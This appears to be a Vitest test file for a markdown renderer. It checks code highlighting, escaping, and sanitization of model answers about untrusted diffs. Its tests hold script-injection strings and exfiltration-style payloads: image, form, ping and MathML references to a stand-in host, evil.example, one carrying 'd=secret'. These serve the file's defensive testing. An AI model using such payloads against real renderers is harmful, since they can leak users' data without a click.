// @vitest-environment jsdom
import { describe, expect, it } from "vitest";
import { html, modelHtml } from "./render";

describe("html (markdown rendering)", () => {
  it("highlights fenced code in a registered language", () => {
    const out = html("```ts\nconst n: number = 1;\n```");
    expect(out).toContain('class="hljs"');
    expect(out).toContain("hljs-keyword"); // `const` got a token span
    expect(out).toContain("hljs-number");
  });

  it("renders unregistered languages as plain escaped code", () => {
    const out = html("```brainfuck\n<+>\n```");
    expect(out).toContain('class="hljs"');
    expect(out).not.toContain("hljs-keyword");
    expect(out).toContain("&lt;+&gt;"); // escaped, not interpreted as HTML
  });

  it("sanitizes script injection", () => {
    const out = html('hello <script>alert(1)</script> <img src=x onerror="x">');
    expect(out).not.toContain("<script>");
    expect(out).not.toContain("onerror");
  });
});

it("tags mermaid fences for client-side rendering instead of highlighting", () => {
  const out = html("```mermaid\nflowchart LR\n  A[App] <--> B[Server]\n```");
  expect(out).toContain('class="rd-mermaid"');
  expect(out).toContain("A[App] &lt;--&gt; B[Server]"); // escaped, still readable
  expect(out).not.toContain("hljs-");
});

describe("modelHtml (answers about untrusted diffs)", () => {
  it("loads nothing remote: no images, media, frames or style urls", () => {
    const out = modelHtml([
      "Answer ![x](https://evil.example/leak?d=secret)",
      '<img src="https://evil.example/a"> <picture><source srcset="https://evil.example/b"></picture>',
      '<video poster="https://evil.example/c"></video> <svg><image href="https://evil.example/d"/></svg>',
      '<p style="background:url(https://evil.example/e)">styled</p> <iframe src="https://evil.example/f"></iframe>',
    ].join("\n\n"));
    expect(out).not.toContain("evil.example");
    expect(out).toContain("Answer");
    expect(out).toContain("styled");
  });

  it("drops form controls and MathML that fetch without a click (security and QA on #509)", () => {
    const out = modelHtml([
      '<input type="image" src="https://evil.example/g">',
      '<form action="https://evil.example/h"><button formaction="https://evil.example/i">go</button></form>',
      '<math><mglyph src="https://evil.example/j"></mglyph></math>',
      '<a href="https://github.com/o/r" ping="https://evil.example/k" data-src="https://evil.example/l">link</a>',
    ].join("\n\n"));
    expect(out).not.toContain("evil.example");
    expect(out).not.toMatch(/<(input|form|button|math|mglyph)\b/);
    expect(out).toContain('href="https://github.com/o/r"');
  });

  it("keeps the text formatting answers use", () => {
    const out = modelHtml("**Bold**, `code`, and a [link](https://github.com/o/r/pull/9).\n\n- one\n- two");
    expect(out).toContain("<strong>Bold</strong>");
    expect(out).toContain("<code>code</code>");
    expect(out).toContain('href="https://github.com/o/r/pull/9"');
    expect(out).toContain("<li>two</li>");
    const rich = modelHtml("```ts\nconst n = 1;\n```\n\n| a | b |\n|:-|-:|\n| 1 | 2 |\n\n```mermaid\nflowchart LR\n  A --> B\n```");
    expect(rich).toContain("hljs-keyword");
    expect(rich).toContain('<td align="right">2</td>');
    expect(rich).toContain('<pre class="rd-mermaid">');
  });
});
